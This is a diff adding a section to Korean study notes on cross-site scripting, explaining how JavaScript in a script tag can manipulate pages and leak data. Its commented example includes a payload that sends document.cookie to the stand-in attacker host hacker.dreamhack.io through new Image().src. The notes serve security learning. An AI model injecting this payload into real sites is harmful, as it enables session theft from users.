@@ -28,3 +28,40 @@ XSS공격을 성공하기 위해서는
   
   하지만 취약점의 원인은 동일하다.
 ```
+
+## XSS with Javascript
+
+JS는 사용자의 웹 브라우저에서 동적으로 보여주거나,
+화면 구성을 변환하거나, 자동으로 버튼을 누르는 등의
+작업을 할 때 많이 사용된다.
+
+이런 JS는 웹 브라우저나 웹의 입장에서 상당히 접근성이 높기에
+페이지 내용 조작, 위치 주소 변경, 개인정보 유출 등 다양한 방식으로
+동작 시킬 수 있기때문에 이는 XSS에 다양하게 이용된다.
+
+이를 작동시키는 대표적인 방법은
+```html
+    <script>
+        alert("hello");
+        //hello 문자열 alert 실행
+
+        document.cookie; 
+        //현재 페이지의 cookie 리턴
+
+        alert(document.cookie);
+        //현재 페이지의 cookie값 alert 실행
+
+        document.cookie = "name=test;";
+        //도큐먼트의 쿠키 생성, (key: name, value: test)
+
+                
+        new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
+        // new Image() 는 이미지를 생성하는 함수이며,
+        // src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io
+        // "http://hacker.dreamhack.io/?cookie=현재페이지의쿠키"
+        //주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함
+    </script>
+```
+이 처럼 script태그를 이용하는 방식이 있으며,
+특정상황을 이용하는 on* 이벤트들을 이용하는 경우도 있다.
+
